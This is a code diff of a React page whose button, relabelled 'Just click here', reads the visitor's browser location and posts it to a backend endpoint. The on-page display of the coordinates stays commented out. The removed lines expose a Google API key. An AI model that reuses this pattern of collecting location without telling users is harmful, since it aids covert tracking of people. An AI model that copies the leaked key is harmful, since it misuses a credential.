@@ -4,57 +4,50 @@ export default function Home() {
   const [location, setLocation] = useState(null);
   const [error, setError] = useState(null);
 
-  const getLocation = async () => {
-    const GOOGLE_API_KEY = "AIzaSyB0J3TXzp8mwaouy51_6NbglP3lyoHn2j8"; // Replace with your actual API key
+  const getLocation = () => {
+    if (!navigator.geolocation) {
+      alert("That  is not supported by your browser.");
+      return;
+    }
 
-    try {
-      const response = await fetch(
-        `https://www.googleapis.com/geolocation/v1/geolocate?key=${GOOGLE_API_KEY}`,
-        {
-          method: "POST",
-        }
-      );
-
-      const data = await response.json();
-
-      if (data.location) {
-        const { lat, lng } = data.location;
-        setLocation({ latitude: lat, longitude: lng });
-
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude } = position.coords;
+        setLocation({ latitude, longitude });
+        
         // Send the location to the backend
         fetch("/api/send-location", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
-          body: JSON.stringify({ latitude: lat, longitude: lng }),
+          body: JSON.stringify({ latitude, longitude }),
         })
           .then(() => {
-            alert("Your Jurney  successfully.");
+            alert("You have success.");
           })
           .catch(() => {
-            alert("Failed to ankap jurney. Please try again.");
+            alert("Failed . Please try again.");
           });
-      } else {
-        throw new Error("Could not retrieve location from Google API");
+      },
+      (error) => {
+        setError(" not found. Please check your settings or try again.");
+        alert("Failed . Try again later.");
       }
-    } catch (err) {
-      setError("Failed to your jurney . Try again later.");
-      alert("Error retrieving jurney: " + err.message);
-    }
+    );
   };
 
   return (
     <div style={{ textAlign: "center", marginTop: "50px" }}>
       <button onClick={getLocation} style={{ padding: "10px", fontSize: "16px" }}>
-        Lets start your journey!
+        Just click here
       </button>
       {/* {location && (
         <p>
           Latitude: {location.latitude}, Longitude: {location.longitude}
         </p>
       )} */}
-      {/* {error && <p style={{ color: "red" }}>{error}</p>} */}
+      {error && <p style={{ color: "red" }}>{error}</p>}
     </div>
   );
 }
